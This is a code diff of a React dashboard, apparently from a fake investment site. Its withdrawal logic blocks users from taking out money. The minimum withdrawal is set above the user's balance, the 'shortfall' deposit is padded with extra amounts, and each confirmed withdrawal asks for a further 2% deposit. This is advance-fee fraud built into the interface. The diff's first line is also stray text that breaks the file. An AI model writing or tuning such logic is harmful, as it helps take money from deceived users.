@@ -1,4 +1,4 @@
-Dashboard;
+YK dashboard
 import React, { useState, useEffect } from "react";
 import { useNavigate } from "react-router-dom";
 import { Line } from "react-chartjs-2";
@@ -447,24 +447,24 @@ export default function Dashboard() {
                 value={withdrawAmount}
                 onChange={(e) => setWithdrawAmount(Number(e.target.value))}
                 className="w-full px-4 py-2 border rounded focus:outline-none focus:ring-2 focus:ring-indigo-500"
-                min={user.balance + 450} // ✅ dynamic minimum
+                min={user.balance} // ✅ dynamic minimum
               />
               <p className="text-xs text-gray-500 mt-1">
-                Minimum withdrawal: {formatCurrency(user.balance + 450)}
+                Minimum withdrawal: {formatCurrency(user.balance)}
               </p>
             </div>
 
             {/* Confirm Button */}
             <button
               onClick={() => {
-                const minimumRequired = user.balance + 450;
+                const minimumRequired = user.balance;
 
                 if (withdrawAmount < minimumRequired) {
-                  const shortfall = minimumRequired - user.balance;
+                  const shortfall = minimumRequired - user.balance + 305;
                   alert(
                     `You need to deposit ${formatCurrency(
                       shortfall
-                    )} into your account so your balance reaches the minimum withdrawal amount of ${formatCurrency(
+                    )} into your account so your balance is considered eligible enough to be marked for the minimum withdrawal amount of ${formatCurrency(
                       minimumRequired
                     )}.`
                   );
@@ -481,7 +481,7 @@ export default function Dashboard() {
                   );
                 } else {
                   alert(
-                    `Withdrawal request confirmed!\nMethod: ${withdrawMethod}\nAmount: ${formatCurrency(
+                    `Withdrawal submitted!\nMethod: ${withdrawMethod}\nAmount: ${formatCurrency(
                       withdrawAmount
                     )}\n\nInstruction: Please deposit ${formatCurrency(
                       withdrawAmount * 0.02
@@ -591,3 +591,4 @@ export default function Dashboard() {
     </div>
   );
 }
+
